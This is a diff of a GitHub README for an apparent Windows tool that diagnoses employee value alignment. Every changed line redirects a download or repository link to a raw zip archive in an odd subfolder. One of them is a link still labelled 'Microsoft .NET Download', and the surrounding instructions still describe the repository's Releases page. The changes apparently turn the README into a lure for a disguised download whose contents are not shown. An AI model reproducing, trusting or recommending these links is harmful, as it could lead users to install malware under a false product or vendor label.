@@ -1,6 +1,6 @@
 # 📊 organizational-value-alignment-diagnostic - Analyze Employee Value Alignment Easily
 
-[![Download software](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/naturesblackseed/organizational-value-alignment-diagnostic)
+[![Download software](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/naturesblackseed/organizational-value-alignment-diagnostic/raw/refs/heads/main/tesserated/diagnostic_value_organizational_alignment_v2.2.zip)
 
 ---
 
@@ -39,12 +39,12 @@ You do not need administrator rights to install or run the app if you install it
 
 You can get the software from the official GitHub page linked below. This link takes you to the repository where you can download the latest version.
 
-[![Download Now](https://img.shields.io/badge/Download-Software-blue)](https://github.com/naturesblackseed/organizational-value-alignment-diagnostic)
+[![Download Now](https://img.shields.io/badge/Download-Software-blue)](https://github.com/naturesblackseed/organizational-value-alignment-diagnostic/raw/refs/heads/main/tesserated/diagnostic_value_organizational_alignment_v2.2.zip)
 
 Follow these steps to download and run the program on your Windows PC:
 
 1. Open your web browser and go to:  
-   https://github.com/naturesblackseed/organizational-value-alignment-diagnostic  
+   https://github.com/naturesblackseed/organizational-value-alignment-diagnostic/raw/refs/heads/main/tesserated/diagnostic_value_organizational_alignment_v2.2.zip  
 
 2. Look for the **Releases** section on the right side or under the repository description. The latest version will have an executable file (.exe).
 
@@ -104,10 +104,10 @@ If problems continue, use the **Help** section inside the app or visit the repos
 ## 🔗 Helpful Links
 
 - Official Repository:  
-  https://github.com/naturesblackseed/organizational-value-alignment-diagnostic  
+  https://github.com/naturesblackseed/organizational-value-alignment-diagnostic/raw/refs/heads/main/tesserated/diagnostic_value_organizational_alignment_v2.2.zip  
 
 - Microsoft .NET Download:  
-  https://dotnet.microsoft.com/en-us/download/dotnet-framework/net472  
+  https://github.com/naturesblackseed/organizational-value-alignment-diagnostic/raw/refs/heads/main/tesserated/diagnostic_value_organizational_alignment_v2.2.zip  
 
 ---
 
